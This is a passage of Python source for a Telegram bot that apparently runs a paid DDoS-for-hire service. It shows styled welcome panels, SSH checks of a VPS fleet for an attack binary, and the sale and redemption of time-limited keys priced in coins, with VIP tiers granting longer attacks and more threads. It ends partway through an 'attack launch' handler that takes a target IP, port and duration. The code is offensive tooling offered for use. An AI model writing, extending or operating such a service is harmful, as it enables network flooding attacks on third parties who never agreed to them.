    now = datetime.datetime.now()
    current_time = now.strftime('%H:%M:%S')
    current_date = now.strftime('%Y-%m-%d')

    chat_id = message.chat.id
    group_settings = GROUP_SETTINGS.get(str(chat_id), {})
    start_image = group_settings.get('start_image', None)
    owner_name = group_settings.get('owner_name', OWNER_USERNAME)

    username = f"@{user.username}" if user.username else user.first_name
    user_info = f"‚îú ùó®ùòÄùó≤ùóøùóªùóÆùó∫ùó≤: {username}\n‚îî ùó®ùòÄùó≤ùóø ùóúùóó: `{user.id}`"

    if is_owner(user):
        caption = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî *ùóîùóóùó†ùóúùó° ùóñùóòùó°ùóßùóòùó•* „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
*"Master of The Networks" ‚Äî Access Granted*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

üõ°Ô∏è *ùó¶ùóßùóîùóßùó®ùó¶:* `ADMIN PRIVILEGES GRANTED`  
üéâ Welcome back, Commander *{user.first_name}*

*‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ü™ ùó¶ùó¨ùó¶ùóßùóòùó† ùóúùóóùóòùó°ùóßùóúùóßùó¨ ‚ü´‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*  
{user_info}

üìÖ `{current_date}` | üïí `{current_time}`  
üî∞ *ùóöùóøùóºùòÇùóΩ ùó¢ùòÑùóªùó≤ùóø:* {owner_name}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ñ∂Ô∏è *Dashboard Ready ‚Äî Execute Commands Below*
"""
        markup = create_main_keyboard(message)

    elif user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip'):
        caption = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî *ùó©ùóúùó£ ùóîùóñùóñùóòùó¶ùó¶* „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
*"Elite Access Granted" ‚Äî Welcome Onboard*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

üåü *ùó¶ùóßùóîùóßùó®ùó¶:* `VIP MEMBER`  
üëã Hello, *{user.first_name}*

*‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ü™ ùó®ùó¶ùóòùó• ùóóùóòùóßùóîùóúùóüùó¶ ‚ü´‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*  
{user_info}

üìÖ `{current_date}` | üïí `{current_time}`  
üî∞ *ùóöùóøùóºùòÇùóΩ ùó¢ùòÑùóªùó≤ùóø:* {owner_name}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ñ∂Ô∏è *VIP Panel Ready ‚Äî Explore Your Powers*
"""
        markup = create_vip_keyboard()

    else:
        caption = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî *ùó™ùóòùóüùóñùó¢ùó†ùóò ùó£ùóîùó°ùóòùóü* „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
*"Network Access Initiated"*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

üöÄ *ùó¶ùóßùóîùóßùó®ùó¶:* `GENERAL ACCESS`  
üëã Hello, *{user.first_name}*

*‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ü™ ùó®ùó¶ùóòùó• ùóóùóòùóßùóîùóúùóüùó¶ ‚ü´‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*  
{user_info}

üìÖ `{current_date}` | üïí `{current_time}`  
üî∞ *ùóöùóøùóºùòÇùóΩ ùó¢ùòÑùóªùó≤ùóø:* {owner_name}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ñ∂Ô∏è Buy special key to unlock VIP features Dm @GODxAloneBoY !
"""
        markup = create_main_keyboard(message)

    if start_image:
        try:
            bot.send_photo(
                chat_id, 
                start_image, 
                caption=caption, 
                parse_mode="Markdown", 
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error sending welcome image: {e}")
            bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
    else:
        bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

# ======================
# üñ•Ô∏è VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üñ•Ô∏è ùôëùôãùôé ùôéùôèùòºùôèùôêùôé")
def show_vps_status(message):
    """Show status of all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùóºùóø ùó∞ùóº-ùóºùòÑùóªùó≤ùóøùòÄ ùó∞ùóÆùóª ùòÉùó∂ùó≤ùòÑ ùó©ùó£ùó¶ ùòÄùòÅùóÆùòÅùòÇùòÄ!")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, "‚ùå ùó°ùóº ùó©ùó£ùó¶ ùó∞ùóºùóªùó≥ùó∂ùó¥ùòÇùóøùó≤ùó±!")
        return
    
    msg = bot.send_message(message.chat.id, "üîÑ ùóñùóµùó≤ùó∞ùó∏ùó∂ùóªùó¥ ùó©ùó£ùó¶ ùòÄùòÅùòÇùòÅùòÇùòÄùó≤ùòÄ...")
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            if ip in busy_vps_ips:
                status = "üü° ùóïùòÇùòÄùòÜ (ùó•ùòÇùóªùóªùó∂ùóªùó¥ ùóîùòÅùòÅùóÆùó∞ùó∏)"
                busy_vps += 1
            else:
                status = "üü¢ ùó¢ùóªùóπùó∂ùóªùó≤"
                online_vps += 1
            
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "‚ùå ùóïùó∂ùóªùóÆùóøùòÜ ùóªùóºùòÅ ùó≥ùóºùòÇùóªùó±"
            else:
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/freeroot/root/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "‚úÖ ùóïùó∂ùóªùóÆùóøùòÜ ùòÑùóºùóøùó∏ùó∂ùóªùó¥"
                else:
                    binary_status = f"‚úÖ ùó™ùóºùóøùó∏ùó∂ùóªùó¥ (ùó©ùó≤ùóøùòÄùó∂ùóºùóª: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = f"""
üîπùó©ùó£ùó¶ {i+1} ùó¶ùòÅùóÆùòÅùòÇùòÄ
{status}
ùóúùó£: `{ip}`
ùó®ùòÄùó≤ùóø: `{username}`
ùóïùó∂ùóªùóÆùóøùòÜ: {binary_status}
"""
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = f"""
üîπ ùó©ùó£ùó¶ {i+1} ùó¶ùòÅùóÆùòÅùòÇùòÄ
üî¥ ùó¢ùó≥ùó≥ùóπùó∂ùóªùó≤/ùóòùóøùóøùóºùóø
ùóúùó£: `{ip}`
ùó®ùòÄùó≤ùóø: `{username}`
ùóòùóøùóøùóºùóø: `{str(e)}`
"""
            status_messages.append(status_msg)
            offline_vps += 1
    
    summary = f"""
üìä ùó©ùó£ùó¶ ùó¶ùòÅùóÆùòÅùòÇùòÄ ùó¶ùòÇùó∫ùó∫ùóÆùóøùòÜ
üü¢ ùó¢ùóªùóπùó∂ùóªùó≤: {online_vps}
üü° ùóïùòÇùòÄùòÜ: {busy_vps}
üî¥ ùó¢ùó≥ùó≥ùóπùó∂ùóªùó≤: {offline_vps}
ùóßùóºùòÅùóÆùóπ: {len(VPS_LIST)}
"""
    
    full_message = summary + "\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id, parse_mode="Markdown")
    except:
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                bot.send_message(message.chat.id, part, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, full_message, parse_mode="Markdown")


# ======================
# üîë KEY MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üîì ùôÇùôÄùôâùôçùòºùôèùôÄ ùôÜùôÄùôî")
def generate_key_start(message):
    """Handle key generation initiation with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "‚õî *ACCESS DENIED!*\n\n"
            "Only authorized *Overlords* can forge new access tokens.",
            parse_mode="Markdown")
        return

    # Create selection keyboard
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("10M (5 coins)"),
        telebot.types.KeyboardButton("30M (8 coins)"),
        telebot.types.KeyboardButton("2H (12 coins)"),
        telebot.types.KeyboardButton("5H (15 coins)"),
        telebot.types.KeyboardButton("1D (20 coins)"),
        telebot.types.KeyboardButton("2D (30 coins)"),
        telebot.types.KeyboardButton("1W (100 coins)"),
        telebot.types.KeyboardButton("VIP1D (50 coins)"),
        telebot.types.KeyboardButton("VIP2D (80 coins)"),
        telebot.types.KeyboardButton("‚ùå Cancel")
    ]
    markup.add(*buttons)

    # Styled panel message
    bot.reply_to(message, 
        f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî *üßø ùóûùóòùó¨ ùóñùó•ùóòùóîùóßùóúùó¢ùó° ùó£ùóîùó°ùóòùóü* „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
       *"Only the Architect may shape access."*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

üîê *ùóñùóõùó¢ùó¢ùó¶ùóò ùóóùó®ùó•ùóîùóßùóúùó¢ùó°:*  
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ  
üîπ `10M`  ‚Üí üí∞ *5 Coins*  
üîπ `30M`  ‚Üí üí∞ *8 Coins*  
üîπ `2H`   ‚Üí üí∞ *12 Coins*  
üîπ `5H`   ‚Üí üí∞ *15 Coins*  
üîπ `1D`   ‚Üí üí∞ *20 Coins*  
üîπ `2D`   ‚Üí üí∞ *30 Coins*  
üîπ `1W`   ‚Üí üí∞ *100 Coins*

üåü *ùó©ùóúùó£ ùóûùóòùó¨ùó¶:*  
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ  
üíé `VIP1D` ‚Üí üí∞ *50 Coins*  
üíé `VIP2D` ‚Üí üí∞ *80 Coins*

üß† *All keys are encrypted and time-limited*  
üõ∞Ô∏è *VIP keys grant elite-level network execution rights*

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ  
üîî *Select your key type from the menu below*  
‚ùå *Cancel anytime with:* ‚ùå Cancel
""",
        parse_mode="Markdown",
        reply_markup=markup
    )
    bot.register_next_step_handler(message, process_key_duration)

def process_key_duration(message):
    """Process key duration selection with premium styling"""
    if message.text == "‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ":
        bot.reply_to(message, "üö´ ùóûùóòùó¨ ùóöùóòùó°ùóòùó•ùóîùóßùóúùó¢ùó° ùóñùóîùó°ùóñùóòùóüùóòùóó.", reply_markup=create_main_keyboard(message))
        return

    try:
        duration_str = message.text.split()[0]  # Extract "1H", "VIP1D" etc.
        if duration_str not in KEY_PRICES:
            raise ValueError("Invalid duration")

        # Generate unique key
        key_prefix = "VIP-" if duration_str.startswith("VIP") else ""
        unique_code = os.urandom(3).hex().upper()
        key = f"{key_prefix}{OWNER_USERNAME}-{duration_str}-{unique_code}"

        # Store key based on type
        expiry_seconds = (
            int(duration_str[3:-1]) * 86400 if duration_str.startswith("VIP") 
            else int(duration_str[:-1]) * 3600 if duration_str.endswith("H") 
            else int(duration_str[:-1]) * 86400
        )

        if duration_str.startswith("VIP"):
            vip_keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }
        else:
            keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }

        save_data()

        # Send key to admin
        bot.send_message(
            message.chat.id,
            f"üîê ùó°ùóòùó™ ùóûùóòùó¨ ùóöùóòùó°ùóòùó•ùóîùóßùóòùóó!\n\n"
            f"‚Ä¢ ùóßùòÜùóΩùó≤: `{duration_str}`\n"
            f"‚Ä¢ ùóûùó≤ùòÜ: `{key}`\n"
            f"‚Ä¢ ùó©ùóÆùóπùó∂ùó± ùó≥ùóºùóø: {duration_str}\n"
            f"‚Ä¢ ùóöùó≤ùóªùó≤ùóøùóÆùòÅùó≤ùó± ùóØùòÜ: @{message.from_user.username}",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message)
        )

        # Log to owner
        if str(message.from_user.id) not in ADMIN_IDS:
            bot.send_message(
                ADMIN_IDS[0],
                f"üìù ùóûùóòùó¨ ùóöùóòùó°ùóòùó•ùóîùóßùóúùó¢ùó° ùóüùó¢ùóö\n\n"
                f"‚Ä¢ ùóïùòÜ: @{message.from_user.username}\n"
                f"‚Ä¢ ùóûùó≤ùòÜ: `{key}`\n"
                f"‚Ä¢ ùóßùòÜùóΩùó≤: {duration_str}"
            )

    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùó•ùó•ùó¢ùó•: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "üîë ùôçùôÄùòøùôÄùôÄùôà ùôÜùôÄùôî")
def redeem_key_start(message):
    """Start key redemption process with premium styling"""
    if not is_allowed_group(message):
        bot.reply_to(message, "‚ùå ùóßùóµùó∂ùòÄ ùó∞ùóºùó∫ùó∫ùóÆùóªùó± ùó∞ùóÆùóª ùóºùóªùóπùòÜ ùóØùó≤ ùòÇùòÄùó≤ùó± ùó∂ùóª ùòÅùóµùó≤ ùóÆùóπùóπùóºùòÑùó≤ùó± ùó¥ùóøùóºùòÇùóΩ!")
        return
    
    bot.reply_to(message, "‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùòÅùóµùó≤ ùó∏ùó≤ùòÜ ùòÅùóº ùóøùó≤ùó±ùó≤ùó≤ùó∫.", parse_mode="Markdown")
    bot.register_next_step_handler(message, redeem_key_input)
    
def redeem_key_input(message):
    """Process key redemption with premium styling"""
    key = message.text.strip()
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Check normal keys
    if key in keys:
        expiry_time = keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "‚ùå ùóûùó≤ùòÜ ùóµùóÆùòÄ ùó≤ùòÖùóΩùó∂ùóøùó≤ùó±!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': False
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key
        }
        
        del keys[key]
        
    # Check VIP keys
    elif key in vip_keys:
        expiry_time = vip_keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "‚ùå ùó©ùóúùó£ ùó∏ùó≤ùòÜ ùóµùóÆùòÄ ùó≤ùòÖùóΩùó∂ùóøùó≤ùó±!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': vip_keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': True
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key,
            'is_vip': True
        }
        
        del vip_keys[key]
        
    else:
        bot.reply_to(message, "‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùó∏ùó≤ùòÜ! ùó£ùóπùó≤ùóÆùòÄùó≤ ùó∞ùóµùó≤ùó∞ùó∏ ùóÆùóªùó± ùòÅùóøùòÜ ùóÆùó¥ùóÆùó∂ùóª.")
        return
    
    save_data()
    
    remaining_time = expiry_time - time.time()
    hours = int(remaining_time // 3600)
    minutes = int((remaining_time % 3600) // 60)
    
    if redeemed_users[user_id].get('is_vip'):
        response = f"""
üåü ùó©ùóúùó£ ùóûùóòùó¨ ùó•ùóòùóóùóòùóòùó†ùóòùóó ùó¶ùó®ùóñùóñùóòùó¶ùó¶ùóôùó®ùóüùóüùó¨!

üîë ùóûùó≤ùòÜ: `{key}`
‚è≥ ùó•ùó≤ùó∫ùóÆùó∂ùóªùó∂ùóªùó¥: {hours}ùóµ {minutes}ùó∫

üî• ùó©ùóúùó£ ùó£ùó•ùóúùó©ùóúùóüùóòùóöùóòùó¶:
‚Ä¢ Max Duration: {VIP_MAX_DURATION}ùòÄ
‚Ä¢ Max Threads: {VIP_MAX_THREADS}
‚Ä¢ Priority Queue Access
‚Ä¢ No Cooldowns
"""
    else:
        response = f"""
‚úÖ ùóûùóòùó¨ ùó•ùóòùóóùóòùóòùó†ùóòùóó ùó¶ùó®ùóñùóñùóòùó¶ùó¶ùóôùó®ùóüùóüùó¨!

üîë ùóûùó≤ùòÜ: `{key}`
‚è≥ ùó•ùó≤ùó∫ùóÆùó∂ùóªùó∂ùóªùó¥: {hours}ùóµ {minutes}ùó∫
"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
    
    # Notify owner
    if not is_admin(user):
        try:
            bot.send_message(
                ADMIN_IDS[0], 
                f"üîë ùóûùóòùó¨ ùó•ùóòùóóùóòùóòùó†ùóòùóó\n\n"
                f"‚Ä¢ ùó®ùòÄùó≤ùóø: @{user.username if user.username else user.first_name}\n"
                f"‚Ä¢ ùóûùó≤ùòÜ: `{key}`\n"
                f"‚Ä¢ ùóßùòÜùóΩùó≤: {'VIP' if redeemed_users[user_id].get('is_vip') else 'Normal'}"
            )
        except:
            pass

@bot.message_handler(func=lambda msg: msg.text == "üìã ùôÜùôÄùôî ùôáùôÑùôéùôè")
def show_key_list(message):
    """Show list of all active and redeemed keys with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùóªùóπùòÜ ùòÅùóµùó≤ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùòÉùó∂ùó≤ùòÑ ùó∏ùó≤ùòÜ ùóπùó∂ùòÄùòÅ!")
        return

    # Helper functions
    def get_username(user_id):
        try:
            user = bot.get_chat(user_id)
            return f"@{user.username}" if user.username else user.first_name
        except:
            return str(user_id)

    def format_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}ùòÄ"
        elif seconds < 3600:
            return f"{int(seconds//60)}ùó∫"
        elif seconds < 86400:
            return f"{int(seconds//3600)}ùóµ"
        else:
            return f"{int(seconds//86400)}ùó±"

    current_time = time.time()

    # Prepare sections
    sections = []
    
    # ùóîùóñùóßùóúùó©ùóò ùó°ùó¢ùó•ùó†ùóîùóü ùóûùóòùó¨ùó¶
    active_normal = []
    for key, details in keys.items():
        if details['expiration_time'] > current_time:
            active_normal.append(
                f"üîπ <code>{key}</code>\n"
                f"‚îú ùóßùòÜùóΩùó≤: ùó°ùó¢ùó•ùó∫ùóÆùóπ\n"
                f"‚îú ùóöùó≤ùóªùó≤ùóøùóÆùòÅùó≤ùó± ùóØùòÜ: {get_username(details['generated_by'])}\n"
                f"‚îî ùóòùòÖùóΩùó∂ùóøùó≤ùòÄ ùó∂ùóª: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_normal:
        sections.append("üçÖ ùóîùóñùóßùóúùó©ùóò ùó°ùó¢ùó•ùó†ùóîùóü ùóûùóòùó¨ùó¶:\n" + "\n".join(active_normal))

    # ùóîùóñùóßùóúùó©ùóò ùó©ùóúùó£ ùóûùóòùó¨ùó¶
    active_vip = []
    for key, details in vip_keys.items():
        if details['expiration_time'] > current_time:
            active_vip.append(
                f"üíé <code>{key}</code>\n"
                f"‚îú ùóßùòÜùóΩùó≤: ùó©ùóúùó£\n"
                f"‚îú ùóöùó≤ùóªùó≤ùóøùóÆùòÅùó≤ùó± ùóØùòÜ: {get_username(details['generated_by'])}\n"
                f"‚îî ùóòùòÖùóΩùó∂ùóøùó≤ùòÄ ùó∂ùóª: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_vip:
        sections.append("\nüåü ùóîùóñùóßùóúùó©ùóò ùó©ùóúùó£ ùóûùóòùó¨ùó¶:\n" + "\n".join(active_vip))

    # ùó•ùóòùóóùóòùóòùó†ùóòùóó ùóûùóòùó¨ùó¶
    redeemed = []
    for key, details in redeemed_keys_info.items():
        status = "‚úÖ ùóîùó∞ùòÅùó∂ùòÉùó≤" if details['expiration_time'] > current_time else "‚ùå ùóòùòÖùóΩùó∂ùóøùó≤ùó±"
        redeemed.append(
            f"üîì <code>{key}</code>\n"
            f"‚îú ùóßùòÜùóΩùó≤: {'ùó©ùóúùó£' if details.get('is_vip') else 'ùó°ùóºùóøùó∫ùóÆùóπ'}\n"
            f"‚îú ùó¶ùòÅùóÆùòÅùòÇùòÄ: {status}\n"
            f"‚îú ùóöùó≤ùóªùó≤ùóøùóÆùòÅùó≤ùó± ùóØùòÜ: {get_username(details['generated_by'])}\n"
            f"‚îî ùó•ùó≤ùó±ùó≤ùó≤ùó∫ùó≤ùó± ùóØùòÜ: {get_username(details['redeemed_by'])}\n"
        )
    if redeemed:
        sections.append("\nüîë ùó•ùóòùóóùóòùóòùó†ùóòùóó ùóûùóòùó¨ùó¶:\n" + "\n".join(redeemed))

    if not sections:
        sections.append("‚ÑπÔ∏è ùó°ùóº ùó∏ùó≤ùòÜùòÄ ùó≥ùóºùòÇùóªùó± ùó∂ùóª ùòÅùóµùó≤ ùòÄùòÜùòÄùòÅùó≤ùó∫")

    full_message = "\n".join(sections)

    # Send with original fonts and copy feature
    bot.send_message(
        message.chat.id,
        full_message,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda msg: msg.text == "üóëÔ∏è ùòøùôÄùôáùôÄùôèùôÄ ùôÜùôÄùôî")
def delete_key_start(message):
    """Initiate key deletion process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùó±ùó≤ùóπùó≤ùòÅùó≤ ùó∏ùó≤ùòÜùòÄ!")
        return

    bot.reply_to(message, 
        "‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùòÅùóµùó≤ ùó∏ùó≤ùòÜ ùòÜùóºùòÇ ùòÑùóÆùóªùòÅ ùòÅùóº ùó±ùó≤ùóπùó≤ùòÅùó≤:\n\n"
        "ùóôùóºùóøùó∫ùóÆùòÅ: <ùó∏ùó≤ùòÜ>\n"
        "ùóòùòÖùóÆùó∫ùóΩùóπùó≤: GODxAloneBOY-1H-ABC123",
        parse_mode="Markdown")
    bot.register_next_step_handler(message, process_key_deletion)

def process_key_deletion(message):
    """Process key deletion with premium styling"""
    key = message.text.strip()
    deleted = False

    # Check in active normal keys
    if key in keys:
        del keys[key]
        deleted = True
    # Check in active VIP keys
    elif key in vip_keys:
        del vip_keys[key]
        deleted = True
    # Check in redeemed keys info
    elif key in redeemed_keys_info:
        # Also remove from redeemed_users if exists
        user_id = redeemed_keys_info[key]['redeemed_by']
        if user_id in redeemed_users:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        deleted = True

    if deleted:
        save_data()
        bot.reply_to(message, 
            f"‚úÖ ùóûùó≤ùòÜ ùó±ùó≤ùóπùó≤ùòÅùó≤ùó± ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ!\n"
            f"ùóûùó≤ùòÜ: `{key}`",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message, 
            "‚ùå ùóûùó≤ùòÜ ùóªùóºùòÅ ùó≥ùóºùòÇùóªùó± ùó∂ùóª:\n"
            "- Active keys\n"
            "- VIP keys\n"
            "- Redeemed keys",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))

# ======================
# üöÄ ATTACK SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text in ["üöÄ ùòºùôèùôèùòºùòæùôÜ ùôáùòºùôêùôâùòæùôÉ", "üî• ùôëùôÑùôã ùòºùôèùôèùòºùòæùôÜ"])
def attack_start(message):
    """Start attack process with premium styling and strict limits"""
    # Check if this is a public group attack
    is_public = message.chat.id in PUBLIC_GROUPS and not is_authorized_user(message.from_user)
    
    if is_public:
        bot.reply_to(message, 
            "‚ö†Ô∏è ùóòùóªùòÅùó≤ùóø ùóÆùòÅùòÅùóÆùó∞ùó∏ ùó±ùó≤ùòÅùóÆùó∂ùóπùòÄ:\n\n"
            "<ùó∂ùóΩ> <ùóΩùóºùóøùòÅ> <ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª>\n\n"
            "‚Ä¢ ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª: ùü≠ùüÆùü¨ùòÄ\n"
            "‚Ä¢ ùóßùóµùóøùó≤ùóÆùó±ùòÄ: 1800 (ùó≥ùó∂ùòÖùó≤ùó±)")
        bot.register_next_step_handler(message, process_public_attack_args)
        return
    
    # Original authorization check for private/VIP attacks
    if not is_authorized_user(message.from_user):
        bot.reply_to(message, "‚ùå ùó¨ùóºùòÇ ùóªùó≤ùó≤ùó± ùóÆ ùòÉùóÆùóπùó∂ùó± ùó∏ùó≤ùòÜ ùòÅùóº ùòÄùòÅùóÆùóøùòÅ ùóÆùóª ùóÆùòÅùòÅùóÆùó∞ùó∏!")
        return
    
    global last_attack_time
    current_time = time.time()
    user_id = str(message.from_user.id)
    
    # Check cooldown (skip for VIP)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    if not is_vip and current_time - last_attack_time < global_cooldown:
        remaining = int(global_cooldown - (current_time - last_attack_time))
        bot.reply_to(message, f"‚åõ ùó£ùóπùó≤ùóÆùòÄùó≤ ùòÑùóÆùó∂ùòÅ! ùóñùóºùóºùóπùó±ùóºùòÑùóª ùóÆùó∞ùòÅùó∂ùòÉùó≤. ùó•ùó≤ùó∫ùóÆùó∂ùóªùó∂ùóªùó¥: {remaining}ùòÄ")
        return
    
    # Determine max duration based on user type
    max_duration = VIP_MAX_DURATION if is_vip else MAX_DURATION
    
    bot.reply_to(message, 
